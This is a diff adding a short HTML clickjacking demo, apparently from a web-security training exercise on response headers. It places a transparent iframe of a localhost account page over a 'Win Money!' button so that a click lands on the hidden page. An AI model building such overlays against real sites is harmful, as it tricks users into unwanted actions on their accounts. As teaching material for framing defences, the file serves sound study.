@@ -1,0 +1,36 @@
+<!DOCTYPE HTML SYSTEM "about:legacy-compat">
+<html lang="en">
+    <head>
+        <title>Clickjacking Demo</title>
+        <style type="text/css">
+#exploit-content
+{
+  width    : 200px;
+  height   : 100px;
+  overflow : hidden;
+  top: 0;
+  position : absolute;
+  opacity: 0;
+  border: 1px solid black;
+}
+
+#exploit-content iframe
+{
+  position : absolute;
+  top      : -100px;
+  left     : -25px;
+  width    : 1280px;
+  height   : 1200px;
+}
+        </style>
+    </head>
+    <body>
+        <form action="#" method="post">
+            <input id="attack" type="submit" value="Win Money!"/>
+        </form>
+
+        <div id="exploit-content">
+            <iframe src="http://localhost:8080/10-headers/account/"></iframe>
+        </div>
+    </body>
+</html>
